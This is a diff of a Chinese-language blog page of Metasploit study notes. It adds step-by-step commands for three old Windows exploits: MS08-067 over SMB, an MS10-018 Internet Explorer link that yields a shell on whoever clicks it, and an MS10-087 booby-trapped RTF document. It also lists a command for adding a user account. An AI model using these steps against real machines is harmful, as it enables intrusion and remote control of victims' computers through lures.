@@ -211,12 +211,13 @@
 <li>net user：查看当前所有用户  </li>
 <li>net user test test /add：添加用户  </li>
 <li>session -i ：查看攻击后返回的信息  </li>
-<li>ifconfig：linux系统中查看ip地址命令</li>
+<li>ifconfig：linux系统中查看ip地址命令  </li>
+<li>打开kali文件夹下的隐藏文件</li>
 </ol>
 <h3 id="MSF渗透测试一"><a href="#MSF渗透测试一" class="headerlink" title="MSF渗透测试一"></a>MSF渗透测试一</h3><p>攻击xp系统，注意是sp2chinese版本的  </p>
 <ol>
 <li>msfconsole &emsp;&emsp;&emsp;进入msf  </li>
-<li>search ms08-067  &emsp;&emsp;&emsp;搜索漏洞  </li>
+<li>search ms08_067  &emsp;&emsp;&emsp;搜索漏洞  </li>
 <li>use exploit/windows/smb/ms08_067_netapi &emsp;&emsp;使用该漏洞  </li>
 <li>show options &emsp;&emsp;&emsp;展示使用方法，看reqiured选项如果是yes是必须设置的，flase则可以不设置   </li>
 <li>set RHOST 192.168.80.128：设置被攻击者的ip  </li>
@@ -227,7 +228,7 @@
 <h3 id="MSF渗透测试二"><a href="#MSF渗透测试二" class="headerlink" title="MSF渗透测试二"></a>MSF渗透测试二</h3><p>利用自己创建链接获取控制其他计算机的权限    </p>
 <ol>
 <li>同上  </li>
-<li>同上  </li>
+<li>同上  search ms10_018</li>
 <li>同上  </li>
 <li>use exploit/windows/browser/ms10_018_ie_behaviors  </li>
 <li>set SRVHOST:表示设置反弹回来的服务器，即攻击成功后，获取权限后，将权限返回到哪个服务器，这里我们选择kali的ip地址  </li>
@@ -236,7 +237,21 @@
 <li>set LPORT： 设置端口  </li>
 <li>run:  运行后出现url地址，复制，作为一个链接  </li>
 <li>当有计算机点击该链接时，kali后台就会返回successful  </li>
-<li>接下来就可以拿shell了，控制目标计算机</li>
+<li>接下来就可以拿shell了，控制目标计算机  </li>
+<li>sessions：查看返回来的会话，如果有多个电脑被攻击，就返回多个电脑的信息  </li>
+<li>sessions -i 1：查看受控制的第一个电脑  </li>
+<li>shell：拿到权限，进入到xp系统主机目录，可以进行操作<h3 id="MSF渗透测试三"><a href="#MSF渗透测试三" class="headerlink" title="MSF渗透测试三"></a>MSF渗透测试三</h3>使用word文件进行渗透 漏洞名称ms10_087  </li>
+<li>同上  </li>
+<li>search ms10-087</li>
+<li>同上  </li>
+<li>use  exploit/windows/fileformat/ms10_087_rtf_pfragments_bof  </li>
+<li>show options  </li>
+<li>set FILENAME oldboy.rtf：将文件改一个名字，默认为msf.rtf  </li>
+<li>set PAYLOAD windows/exec ：上传一个payload  </li>
+<li>show options：  </li>
+<li>set CMD calc.exe :上传一个计算机程序  </li>
+<li>run：开始生成一个文件  </li>
+<li>找到文件存放路径，将该文件放到win7以上的系统上面进行使用即可</li>
 </ol>
 <hr>
 
